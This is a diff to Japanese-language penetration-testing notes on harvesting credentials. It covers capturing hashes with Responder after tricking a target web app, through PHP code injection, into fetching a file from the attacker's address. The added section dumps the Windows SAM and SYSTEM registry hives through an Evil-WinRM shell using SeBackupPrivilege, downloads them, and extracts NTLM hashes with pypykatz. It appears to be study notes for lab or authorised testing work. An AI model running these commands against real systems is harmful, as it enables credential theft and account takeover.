@@ -32,13 +32,39 @@ https://crackstation.net/
 responder -I tun0
 ```
 Responderを使用することで様々な通信を受けることができる
-
-### 攻撃対象からResponderへの通信を発生させる
 responderを起動した後、攻撃対象のWebアプリケーション等に対して外部のファイルを取得するように動かす
 ```
 例：PHPでinclude(//<受けのIPアドレス>/somefile)を実行されるようCodeInjectionを行うなど
 ```
 取得できたハッシュをjohnなどで解析する
+
+### Windowsレジストリにアクセスできる場合
+Windowsでレジストリにアクセスできる場合、以下の情報を集めると良い
+* HKLM\SAM: ユーザーパスワードのNTLMv2 ハッシュを含む
+* HKLM\security: キャッシュされたドメインレコード LSAシークレット/LSAキーを含む
+* HKLM\system – 別名 SYSKEY: LSAシークレットやSAMデータベースを暗号化するために使用可能なキーを含む
+hklm\systemとhklm\samからNTLMハッシュを取得できる
+
+参考：
+https://kb.offsec.nl/tools/framework/pypykatz/
+
+(例) SeBackupPrivilege権限を持つ場合に、レジストリからNTLMハッシュを生成
+何かしらのユーザ情報を使用してEvil-WinRMでシェルを取っており、ユーザがSeBackupPrivilege権限を持っている前提
+```
+*Evil-WinRM* PS C:\> reg save hklm\sam c:\Temp\sam
+*Evil-WinRM* PS C:\> reg save hklm\system c:\Temp\system
+```
+でレジストリをコピー
+```
+*Evil-WinRM* PS C:\Temp> download sam
+*Evil-WinRM* PS C:\Temp> download system
+```
+でファイルをダウンロードする。ダウンロードしたファイルを元にpypykatzを使用してNTLMハッシュを生成する
+```
+$ pypykatz registry --sam sam system
+```
+# 参考文献
+https://kb.offsec.nl
 
 ## デフォルトパスワードの使用
 サービスごとのデフォルトパスワードでログインできないか試行する。
